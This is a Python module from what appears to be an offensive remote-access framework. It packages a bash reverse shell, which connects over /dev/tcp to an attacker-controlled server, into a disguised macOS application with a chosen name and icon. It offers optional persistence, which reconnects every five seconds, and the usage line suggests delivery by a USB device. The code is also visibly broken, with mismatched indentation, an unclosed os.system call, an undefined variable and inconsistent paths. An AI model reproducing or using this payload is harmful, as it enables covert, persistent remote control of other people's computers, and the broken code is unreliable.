from modules import helper as h
import os, time

class payload:
	def __init__(self):
		self.name = "MacOS Application"
		self.description = "Convert payload into the macOS Application."
		self.usage = "Install via arduino."

	def run(self,server):
		while 1:
                        name = raw_input(h.info_general_raw("Application Name> "))
                        icon = raw_input(h.info_general_raw("Application Icon> "))
			persistence = raw_input(h.info_general_raw("Make Persistent? (y/N): ")).lower()
			if persistence == "y":
				shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
				break
			elif persistence == "n" or not persistence:
				shell_command = "bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
				break
			else:
				h.info_error("invalid option: " + persistence)

		if os.path.exists("payloads") == False:
			os.mkdir("payloads")
		if os.path.exists("payloads/macos_application") == False:
			os.mkdir("payloads/macos_application")
                        os.system("""
cp resources/application.app payloads/macos_application
mv payloads/macos_application payloads/"""+name+""".app
mv """+icon+""" payloads/"""+name+""".app/Contents/Resources/PowerShell.icns
                        """
		payload_save_path = "payloads/macos_application/"+name+".app/Contents/MacOS/PowerShell.sh"
                sas = "payloads/macos_application/"+name+""
		payload = """\
#! /usr/local/bin/env bash
"""+shell_command+"""
                """
		f = open(payload_save_path,"w")
		f.write(payload)
		f.close()
		h.info_general("Payload saved to " + payload_save_path_sas)


